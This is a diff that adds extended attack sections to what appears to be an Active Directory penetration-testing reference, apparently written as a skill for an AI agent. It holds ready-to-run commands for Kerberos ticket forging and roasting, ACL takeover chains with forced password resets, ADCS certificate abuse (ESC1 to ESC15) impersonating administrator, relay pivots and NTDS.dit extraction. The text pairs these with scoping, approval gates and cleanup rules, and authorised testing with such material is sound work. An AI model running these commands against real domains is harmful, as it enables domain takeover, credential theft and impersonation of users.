@@ -138,3 +138,216 @@ Record in `cleanup.md` and REVERT: added group members, shadow-cred key links (`
 created computer accounts (ATTACKSYS$), RBCD writes (`rbcd.py -action flush`), issued certs (revoke via CA),
 tickets/ccaches, enabled templates/officers (ESC7 — disable/remove). No golden-ticket persistence; no
 whole-domain NTDS dump; single test account for DCSync.
+
+---
+
+## Extended arsenal — Kerberos   (crack OFFLINE · tickets CAPABILITY-ONLY · no persistence)
+Note: the existing **Cleanup contract** (end of file) governs everything below — revert/destroy every object
+and ticket you create, redact any recovered NT/key to a fingerprint, single test account for any DCSync.
+```
+# UnPAC-the-hash — recover an account's NT from a cert/PKINIT (password never seen); offline-equivalent
+gettgtpkinit.py -cert-pfx <pfx> -pfx-pass <pw> <d>/<testuser> out.ccache        # cert -> TGT (+ AS-REP key)
+KRB5CCNAME=out.ccache getnthash.py -key <AS-REP-key> <d>/<testuser>             # TGT -> NT (redact to fp)
+certipy auth -pfx <pfx> -dc-ip <dc>                                             # one-shot equivalent (NT + ccache)
+#   use: proves a cert == password-equivalent for ONE test principal; cross-ref ADCS ESC / shadow-cred.
+
+# RC4 encryption-downgrade roast — force an RC4 TGS even when the acct supports AES (etype downgrade)
+Rubeus.exe kerberoast /tgtdeleg /spn:<spn>           # /tgtdeleg -> RC4 (13100) ticket -> cracks far faster
+Rubeus.exe kerberoast /rc4opsec                       # inverse: only roast RC4-supporting accts (no downgrade)
+#   note: downgrade shows as Event 4769 ticket-enc 0x17 while the acct holds AES keys — louder, catalogue it.
+
+# Bronze Bit — CVE-2020-17049 (feasibility/awareness; patched Nov-2020) — forge "forwardable" inside S4U
+getST.py -spn cifs/<t> -impersonate <protected_user> -force-forwardable -hashes ':<h>' '<d>/<svc>$' -dc-ip <dc>
+#   lets a constrained-deleg acct impersonate "not-delegatable"/Protected-Users principals. APPROVAL-GATED.
+
+# Diamond vs Golden (CAPABILITY-ONLY — test principal; demo then PURGE, never persist)
+#   golden  = forge a TGT from scratch with the krbtgt key (ticketer, base ref)  -> anomalous PAC, easier to flag
+#   diamond = decrypt a REAL TGT with krbtgt AES, edit its PAC, re-encrypt         -> blends with a legit logon
+Rubeus.exe diamond /tgtdeleg /krbkey:<krbtgt_aes256> /ticketuser:<testuser> /ticketuserid:<rid> /groups:512 /ptt
+#   silver/sapphire already covered; after the diamond demo -> klist purge / kdestroy immediately.
+
+# Cross-realm / trust traversal (CAPABILITY-ONLY, APPROVAL-GATED — do NOT operate a prod child->parent hop)
+lookupsid.py '<d>/<u>:<p>'@<dc>                                  # harvest SIDs incl. Enterprise Admins (-519)
+ticketer.py -nthash <trust_key> -domain-sid <child_sid> -domain <child> \
+            -extra-sid <parent_sid>-519 -spn krbtgt/<parent> <testuser>   # forge inter-realm referral TGT
+#   feasibility only: proves a SID-filtering gap across the trust; forge for a TEST SID, never traverse with it.
+
+# ccache <-> kirbi conversion (base ref already has the KRB5CCNAME + '-k -no-pass' consume flow)
+ticketConverter.py ticket.kirbi ticket.ccache          ticketConverter.py ticket.ccache ticket.kirbi
+nxc smb <t> -k --use-kcache            Rubeus.exe ptt /ticket:ticket.kirbi      # consume on Linux / Windows
+
+# SPN-less / computed-SPN roasting nuance
+#   Kerberoast REQUIRES a target SPN. Acct with none -> (a) GenericWrite: set a temp SPN, roast, REMOVE it
+#   (targetedKerberoast, see ACL section); or (b) skip it: computer/gMSA implicit host/* SPNs use 128-char
+#   random keys and are crack-resistant -> catalogue, don't burn compute. Prioritise USER SPNs.
+
+# FAST / Kerberos Armoring awareness (defensive context — no action)
+#   if the DC enforces FAST/armoring, the AS-REQ is tunnelled -> AS-REP roast + pre-auth downgrade are blocked.
+#   Record it in review.md as a POSITIVE control; do not attempt to strip or downgrade it.
+
+# MachineAccountQuota (MAQ) -> feeds RBCD / shadow-cred / computer-based abuse
+nxc ldap <dc> -u <u> -p <p> -M maq                              # read ms-DS-MachineAccountQuota (default 10)
+Get-DomainObject -Identity '<d>' -Properties ms-DS-MachineAccountQuota
+#   MAQ>0 => any domain user may add ATTACKSYS$ (addcomputer.py, ACL section) -> RBCD without admin rights.
+```
+
+---
+
+## Extended arsenal — ACL abuse   (exercise ONE edge on a TEST principal, then REVERT)
+Note: the existing **Cleanup contract** applies — every owner/DACL/attribute/membership change below is REVERTED
+(record originals first); any DCSync = single test account; recovered secrets redacted to fingerprints.
+```
+# Edge -> primitive decision table (pick the quietest reversible primitive)
+#   WriteOwner        -> take ownership -> WriteDacl -> grant rights -> reset/shadow   (full chain below)
+#   WriteDacl         -> grant self GenericAll/ForceChangePassword/DCSync, act, then dacledit -remove
+#   GenericAll(user)  -> ForceChangePassword  OR  shadow-cred (no pw reset = quieter + reversible)
+#   GenericAll(comp)  -> shadow-cred (recover NT, no reboot)  OR  RBCD (needs MAQ / an owned computer)
+#   GenericWrite      -> targetedKerberoast (temp SPN)  OR  shadow-cred  OR  msDS-AllowedToDelegateTo write
+#   Self (on group)   -> add SELF as member (AddSelf)
+#   WriteDacl/Owns on domain head -> DCSync grant (SINGLE test acct only)
+#   Decision GA-on-computer: prefer SHADOW-CRED (instant NT, no RBCD object, no reboot); use RBCD only if
+#   PKINIT/ADCS is unavailable — and clean the msDS-AllowedToActOnBehalfOfOtherIdentity write afterwards.
+
+# WriteOwner -> WriteDacl -> grant-rights -> reset  (exact chain, impacket)
+owneredit.py -action write -new-owner '<u>' -target '<victim>' '<d>/<u>:<p>' -dc-ip <dc>     # 1 take ownership
+dacledit.py  -action write -rights FullControl -principal '<u>' -target '<victim>' '<d>/<u>:<p>' -dc-ip <dc>  # 2 WriteDacl->GA
+net rpc password '<victim>' '<Newpw!>' -U '<d>/<u>%<p>' -S <dc>                              # 3 ForceChangePassword
+#   REVERT: dacledit -action remove (same ACE) ; owneredit back to the ORIGINAL owner (recorded in step 0).
+
+# Same chain, single modern tool (bloodyAD)
+bloodyAD -d <d> -u <u> -p <p> --host <dc> set owner <victim> <u>
+bloodyAD -d <d> -u <u> -p <p> --host <dc> add genericAll <victim> <u>
+bloodyAD -d <d> -u <u> -p <p> --host <dc> set password <victim> '<Newpw!>'                   # ForceChangePassword
+bloodyAD ... remove genericAll <victim> <u>  ;  ... set owner <victim> <ORIG_OWNER>          # REVERT both
+
+# ForceChangePassword — three equivalent flows (capture old value if a login must be restored)
+net rpc password <victim> <new> -U '<d>/<u>%<p>' -S <dc>
+bloodyAD -d <d> -u <u> -p <p> --host <dc> set password <victim> <new>
+changepasswd.py '<d>/<victim>'@<dc> -newpass <new> -altuser '<u>' -altpass '<p>' -reset       # SAMR force-reset
+
+# AddSelf — you hold Self / Write-Member on a group (add self, then remove)
+bloodyAD -d <d> -u <u> -p <p> --host <dc> add groupMember '<group>' '<u>'   ;   ... remove groupMember ...  # REVERT
+net rpc group addmem '<group>' '<u>' -U '<d>/<u>%<p>' -S <dc>               ;   ... delmem ...              # REVERT
+
+# msDS-AllowedToDelegateTo write = grant yourself CONSTRAINED delegation (GenericWrite on a principal)
+bloodyAD -d <d> -u <u> -p <p> --host <dc> set object '<owned>$' msDS-AllowedToDelegateTo -v 'cifs/<t>'
+#   then S4U:  getST.py -spn cifs/<t> -impersonate <testadmin> '<d>/<owned>$':<pw> -dc-ip <dc>
+#   REVERT: clear the attribute (bloodyAD remove object ... msDS-AllowedToDelegateTo) + drop userAccountControl T2A4D bit.
+
+# scriptPath / profilePath write — benign MARKER only (APPROVAL-GATED, revert)
+bloodyAD -d <d> -u <u> -p <p> --host <dc> set object '<victim>' scriptPath -v 'rs_marker.cmd'
+#   place a NO-OP rs_marker.cmd (echo-only) in NETLOGON to prove logon-script execution, then BLANK the attr +
+#   delete the file. Never a payload; never left in place.
+
+# GPO-edit abuse via write on a linked GPO — benign MARKER (APPROVAL-GATED, auto-revert)
+pygpoabuse.py <d>/<u>:<p> -gpo-id <GUID> --command "cmd /c echo rs_marker> C:\\windows\\temp\\rs.txt" --taskname rs_t
+SharpGPOAbuse.exe --AddComputerTask --TaskName rs_t --Author <u> --Command cmd.exe --Arguments "/c echo marker" --GPOName "<gpo>"
+#   proves GPO write -> code on every linked host. REMOVE the task + restore gPCMachineExtensionNames/versionNumber. Echo ONLY.
+
+# dMSA "BadSuccessor" + SID-history — AWARENESS / FEASIBILITY ONLY (enumerate, do not operate)
+#   dMSA: a writable msDS-ManagedAccountPrecededByLink on a delegated-MSA can inherit a target's keys -> privesc;
+#         flag the writable dMSA in review.md, do NOT migrate/activate it.
+bloodyAD -d <d> -u <u> -p <p> --host <dc> get search --filter '(sidHistory=*)' --attr sAMAccountName,sidHistory
+#   sidHistory holding a privileged SID = standing backdoor -> ENUMERATE + report; writing it (DCShadow/-extra-sid)
+#   is catalogue-NOT-fire.
+```
+
+---
+
+## Extended arsenal — ADCS (ESC extended)   (issue as a TEST principal, then REVOKE)
+Note: the existing **Cleanup contract** applies — revoke every issued cert, restore any template / registry /
+mapping change, redact any recovered key or NT to a fingerprint. High-impact ESC paths are APPROVAL-GATED.
+```
+# Read-only CA / template enumeration (no issuance)
+certipy find -u <u>@<d> -p <p> -dc-ip <dc> -stdout -vulnerable -hide-admins      # only the ESC-flagged templates
+certipy find -u <u>@<d> -p <p> -dc-ip <dc> -enabled -json -output rs_adcs        # full inventory to file
+certutil -config "<ca_srv>\<ca>" -ping   ;   certutil -template   ;   certutil -catemplates   # native, read-only
+#   LDAP: enrollment services = CN=Enrollment Services,CN=Public Key Services,CN=Services,CN=Configuration,<dn>
+
+# ESC1 — SAN identity type matters: UPN (user) vs dNSHostName (machine/DC)
+certipy req -u <u>@<d> -p <p> -ca <ca> -template <tpl> -upn administrator@<d>    # impersonate a USER  (UPN SAN)
+certipy req -u <u>@<d> -p <p> -ca <ca> -template <tpl> -dns <dc_fqdn>            # impersonate a MACHINE (dNSHostName)
+certipy req ... -upn administrator@<d> -sid <target_sid>                         # add SID for post-2022 strong binding
+#   auth back: UPN cert -> certipy auth (user NT) ; DNS cert -> PKINIT as <dc>$ -> cross-ref UnPAC-the-hash.
+
+# ESC3 — Enrollment Agent full chain (template with the Certificate-Request-Agent EKU)
+certipy req -u <u>@<d> -p <p> -ca <ca> -template 'Enrollment Agent'                            # 1 get agent pfx (ea.pfx)
+certipy req -u <u>@<d> -p <p> -ca <ca> -template User -on-behalf-of '<d>\administrator' -pfx ea.pfx  # 2 on-behalf-of
+certipy auth -pfx administrator.pfx -dc-ip <dc>                                                # 3 auth as impersonated user
+#   REVOKE both the agent cert and the OBO cert (ESC7 -revoke / CA console).
+
+# ESC9 (no security extension) / ESC10 (weak mapping) — sharper steps
+#   ESC9 = template lacks szOID_NTDS_CA_SECURITY_EXT (no SID baked in) -> a spoofed UPN survives strong binding
+certipy shadow auto -u <u>@<d> -p <p> -account <victim>                          # recover <victim> NT (shadow-cred)
+certipy account update -u <u>@<d> -p <p> -user <victim> -upn administrator@<d>   # set victim UPN = target
+certipy req -u <victim>@<d> -hashes <victim_nt> -ca <ca> -template <esc9tpl>     # cert now maps to administrator
+certipy account update -u <u>@<d> -p <p> -user <victim> -upn <victim>@<d>        # REVERT the UPN
+#   ESC10 = DC registry weak map: CertificateMappingMethods=0x4 (UPN) OR StrongCertificateBindingEnforcement=0
+#     -> same UPN-swap trick, no template precondition. Enumerate the reg value, report, then same UPN revert.
+
+# ESC11 — IF_ENFORCEENCRYPTICERTREQUEST not set on CA RPC (ICPR relay one-liner is in the base ref)
+certipy find -u <u>@<d> -p <p> -dc-ip <dc> -stdout | grep -i 'Enforce Encryption for Requests'  # confirm precondition
+#   pair with non-disruptive coercion from the lateral-movement ref; APPROVAL-GATED.
+
+# ESC13 — issuance policy linked to an AD group (msDS-OIDToGroupLink)
+certipy find -u <u>@<d> -p <p> -dc-ip <dc> -stdout | grep -i ESC13               # template whose policy OID -> a group
+certipy req -u <u>@<d> -p <p> -ca <ca> -template <esc13tpl>                      # TGT carries the GROUP SID (no member add)
+certipy auth -pfx <u>.pfx -dc-ip <dc>                                            # token shows the linked group -> revoke to remove
+
+# ESC14 — write access to altSecurityIdentities (explicit cert mapping) — AWARENESS
+bloodyAD -d <d> -u <u> -p <p> --host <dc> set object <victim> altSecurityIdentities -v 'X509:<I>...<S>...'
+#   if you can write altSecurityIdentities on <victim>, map YOUR test cert's issuer+serial -> auth as victim.
+#   Feasibility/awareness: enumerate who holds that write; if exercised, CLEAR the attribute to REVERT.
+
+# ESC15 / EKUwu — CVE-2024-49019: schema-version-1 templates accept attacker Application Policies from the CSR
+certipy req -u <u>@<d> -p <p> -ca <ca> -template <v1tpl> -application-policies 'Client Authentication'
+certipy req ... -application-policies 'Certificate Request Agent' -upn administrator@<d>   # -> ESC3-style on-behalf-of
+#   injects a Client-Auth EKU into a v1 template that never intended it -> PKINIT; REVOKE the issued cert.
+
+# PKINIT -> NT cross-ref: any pfx above -> UnPAC-the-hash (see Extended arsenal — Kerberos) for the NT fingerprint.
+```
+
+---
+
+## Extended arsenal — Lateral movement   (reach ONE more in-scope host, benign cmd, then clean up)
+Note: the existing **Cleanup contract** applies — single recovered/test credential, benign proof command only,
+remove every artifact (tickets, temp files, test tasks, tunnels). No golden-ticket persistence.
+```
+# WinRM / PSRemoting exec channels 5985/5986 (base ref already has evil-winrm -H; add the rest)
+nxc winrm <t> -u <u> -p <p> -x 'whoami /all'                                     # -H <h> or -k also work
+# from Windows: $s=New-PSSession <t> -Credential $c ; Invoke-Command -Session $s -ScriptBlock {hostname}
+# SSH-on-Windows (OpenSSH server present): ssh '<d>\<u>'@<t> 'whoami'            # GSSAPI/-k where Kerberos is allowed
+
+# Additional DCOM exec objects (pick a non-default to dodge MMC20-only detections)
+dcomexec.py -object ShellWindows <d>/<u>:<p>@<t> 'whoami'
+dcomexec.py -object ShellBrowserWindow <d>/<u>:<p>@<t> 'whoami'
+#   others: Excel.Application/ExcelDDE, Outlook, Visio — enumerate app presence (RO) before invoking.
+
+# Read-only WMI / CIM recon (no exec — map before you touch)
+nxc wmi <t> -u <u> -p <p> -q "SELECT * FROM Win32_LoggedOnUser"                  # who is logged on
+Get-CimInstance -ComputerName <t> -ClassName Win32_Service -Filter "StartName LIKE '%@%'"   # svc accts w/ SPNs
+wmic /node:<t> /user:'<d>\<u>' process list brief                               # legacy, read-only process list
+
+# Ticket renewal / forwarding (base has getTGT/asktgt/ptt; add lifetime mgmt) — PURGE after the proof
+Rubeus.exe renew /ticket:<t.kirbi> /ptt            kinit -R                      # renew within renew-till window
+Rubeus.exe asktgt /user:<u> /aes256:<k> /opsec /forwardable                     # forwardable TGT for S4U chains
+klist purge    /    kdestroy                                                     # PURGE every ticket once proven
+
+# RDP cred-injection nuance (base ref has xfreerdp /pth + runas hostname=Krb/IP=NTLM) — add the preconditions
+#   PtH over RDP REQUIRES target RestrictedAdmin mode (DisableRestrictedAdmin=0); otherwise /pth is refused.
+cmdkey /add:<t_FQDN> /user:'<d>\<u>' /pass:<p>  ;  mstsc /v:<t_FQDN>             # FQDN -> Kerberos SSO ; raw IP -> NTLM
+
+# SOCKS pivot through a relay / proxy (reach segmented hosts)
+ntlmrelayx.py -tf targets.txt -smb2support -socks                               # opens SOCKS; type 'socks' to list sessions
+proxychains4 nxc smb <internal> -u <u> -p <p>        proxychains4 secretsdump.py <d>/<u>@<internal>
+#   (ligolo-ng / chisel = alternative pivots) — keep every tunnel scoped and tear it down in cleanup.
+
+# SCCM / Kerberos-relay cross-reference (not repeated here)
+#   SCCM site + client-push / credential abuse -> see the sccm-exploitation skill.
+#   Kerberos relay (krbrelayx) where NTLM is blocked -> APPROVAL-GATED; cross-ref the coercion lines above.
+
+# Shadow-copy / VSS NTDS extraction — CATALOGUED, NOT FIRED (disk + prod impact; explicit approval + DCSync-first)
+#   vssadmin create shadow /for=C:  ->  copy NTDS.dit + SYSTEM      (OR  ntdsutil "ac i ntds" "ifm" "create full <p>")
+#   nxc smb <dc> -u <u> -p <p> -M ntdsutil                          # single-command variant
+#   DO NOT run against production DCs; prefer single-account DCSync (base ref). Catalogue the vector only.
+```
